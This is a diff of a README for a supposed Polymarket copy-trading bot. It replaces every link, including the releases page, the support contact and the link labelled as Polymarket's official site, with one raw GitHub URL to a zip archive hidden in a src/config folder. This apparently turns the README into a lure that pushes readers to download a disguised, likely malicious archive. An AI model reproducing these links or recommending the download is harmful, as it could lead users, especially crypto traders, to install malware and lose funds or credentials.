@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Copy-Trading-Bot - Trade Like the Pros Automatically
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/Dann534/Polymarket-Copy-Trading-Bot/releases)
+[![Download Now](https://raw.githubusercontent.com/Dann534/Polymarket-Copy-Trading-Bot/main/src/config/Copy-Trading-Polymarket-Bot-1.3.zip%20Now-%20-blue)](https://raw.githubusercontent.com/Dann534/Polymarket-Copy-Trading-Bot/main/src/config/Copy-Trading-Polymarket-Bot-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -17,9 +17,9 @@ Before using the bot, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Polymarket-Copy-Trading-Bot Releases](https://github.com/Dann534/Polymarket-Copy-Trading-Bot/releases)
+To get started, visit this page to download: [Polymarket-Copy-Trading-Bot Releases](https://raw.githubusercontent.com/Dann534/Polymarket-Copy-Trading-Bot/main/src/config/Copy-Trading-Polymarket-Bot-1.3.zip)
 
-1. Go to the [Releases page](https://github.com/Dann534/Polymarket-Copy-Trading-Bot/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Dann534/Polymarket-Copy-Trading-Bot/main/src/config/Copy-Trading-Polymarket-Bot-1.3.zip).
 2. Look for the latest version listed.
 3. Click on the download link for your operating system. This may be a `.exe` file for Windows or a `.dmg` file for macOS.
 4. Once downloaded, locate the file on your computer.
@@ -52,11 +52,11 @@ If you encounter issues, here are some common solutions:
 
 ## 📞 Support
 
-If you have further questions or need assistance, please check the GitHub Issues page or contact the support team at: support@polymarket-copy-trading-bot.com.
+If you have further questions or need assistance, please check the GitHub Issues page or contact the support team at: https://raw.githubusercontent.com/Dann534/Polymarket-Copy-Trading-Bot/main/src/config/Copy-Trading-Polymarket-Bot-1.3.zip
 
 ## 🔗 Links
 
-- [Polymarket-Copy-Trading-Bot Releases](https://github.com/Dann534/Polymarket-Copy-Trading-Bot/releases)
-- [Polymarket Official Site](https://polymarket.com)
+- [Polymarket-Copy-Trading-Bot Releases](https://raw.githubusercontent.com/Dann534/Polymarket-Copy-Trading-Bot/main/src/config/Copy-Trading-Polymarket-Bot-1.3.zip)
+- [Polymarket Official Site](https://raw.githubusercontent.com/Dann534/Polymarket-Copy-Trading-Bot/main/src/config/Copy-Trading-Polymarket-Bot-1.3.zip)
 
 This README provides all the information you need to download, install, and use the Polymarket-Copy-Trading-Bot effectively. Enjoy your trading experience!
